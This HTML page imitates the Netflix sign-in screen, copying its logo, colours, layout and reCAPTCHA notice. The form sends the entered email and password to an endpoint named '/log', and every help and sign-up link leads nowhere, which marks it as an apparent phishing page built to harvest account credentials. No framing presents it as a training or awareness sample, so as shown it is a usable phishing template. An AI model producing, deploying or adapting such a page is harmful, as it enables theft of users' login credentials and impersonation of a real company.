<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32' fill='%23E50914'><path d='M5.398 0v32l9.602-5.2V0zm9.602 0v26.8L25 32V5.2z'/></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1920 1080"><rect fill="%23000" width="1920" height="1080"/><linearGradient id="g"><stop offset="0" stop-color="%23000" stop-opacity="0.7"/><stop offset="1" stop-color="%23000" stop-opacity="0.9"/></linearGradient><rect fill="url(%23g)" width="1920" height="1080"/></svg>') center/cover;
            opacity: 0.5;
            z-index: 0;
        }

        .header {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 20px 50px;
            z-index: 10;
        }

        .logo {
            width: 167px;
            height: 45px;
            color: #e50914;
            font-size: 40px;
            font-weight: bold;
            letter-spacing: -2px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            padding: 60px 68px 40px;
            background: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            z-index: 1;
        }

        h1 {
            font-size: 32px;
            font-weight: 500;
            margin-bottom: 28px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .input-wrapper {
            margin-bottom: 16px;
        }

        input {
            width: 100%;
            height: 50px;
            padding: 16px 20px 0;
            border: none;
            border-radius: 4px;
            background: #333;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: background 0.2s;
        }

        input:focus {
            background: #454545;
        }

        input::placeholder {
            color: #8c8c8c;
        }

        .sign-in-btn {
            width: 100%;
            height: 50px;
            background: #e50914;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 24px;
            transition: background 0.2s;
        }

        .sign-in-btn:hover {
            background: #f40612;
        }

        .sign-in-btn:active {
            background: #c11119;
        }

        .remember-me {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 12px;
            font-size: 13px;
            color: #b3b3b3;
        }

        .remember-me label {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            margin: 0;
        }

        .help-link {
            color: #b3b3b3;
            text-decoration: none;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .signup-now {
            margin-top: 16px;
            font-size: 16px;
            color: #737373;
        }

        .signup-now a {
            color: #fff;
            text-decoration: none;
        }

        .signup-now a:hover {
            text-decoration: underline;
        }

        .recaptcha-text {
            margin-top: 16px;
            font-size: 13px;
            color: #8c8c8c;
            line-height: 1.4;
        }

        .recaptcha-text a {
            color: #0071eb;
            text-decoration: none;
        }

        .recaptcha-text a:hover {
            text-decoration: underline;
        }

        @media (max-width: 740px) {
            .container {
                padding: 30px;
                background: transparent;
            }

            .header {
                padding: 20px;
            }

            .logo {
                width: 120px;
                height: 32px;
                font-size: 32px;
            }

            h1 {
                font-size: 26px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">NETFLIX</div>
    </div>

    <div class="container">
        <h1>Sign In</h1>

        <form action="/log" method="POST">
            <div class="input-wrapper">
                <input type="text" name="email" placeholder="Email or phone number" required autocomplete="username">
            </div>

            <div class="input-wrapper">
                <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
            </div>

            <button type="submit" class="sign-in-btn">Sign In</button>

            <div class="remember-me">
                <label>
                    <input type="checkbox" checked>
                    <span>Remember me</span>
                </label>
                <a href="#" class="help-link">Need help?</a>
            </div>
        </form>

        <div class="signup-now">
            New to Netflix? <a href="#">Sign up now</a>.
        </div>

        <div class="recaptcha-text">
            This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.
        </div>
    </div>
</body>
</html>
